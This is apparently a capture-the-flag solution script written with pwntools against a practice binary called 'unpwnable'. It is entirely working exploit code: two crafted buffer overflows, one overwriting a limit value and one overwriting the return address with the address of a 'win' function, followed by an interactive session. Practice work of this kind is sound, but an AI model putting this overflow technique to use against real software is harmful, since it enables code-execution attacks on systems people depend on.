#!/usr/bin/env python3
from pwn import remote, args, ELF, p64, p32
import sys

elf = ELF("./unpwnable")
if args.REMOTE:
    serv = sys.argv[1]
    port = int(sys.argv[2])
    r = remote(serv, port) #Change host and port
else:
    r = elf.process()

# Overwriting limit
r.recvuntil(b':')
r.sendline(b'a' * 76 + p32(96))

# Sending right choice
r.recvuntil(b'stuff')
r.sendline(b'69')

#Overwriting return address
r.recvuntil(b'it.')
r.sendline(b'a'*88 + p64(elf.sym['win']))

#Flag!
r.interactive()
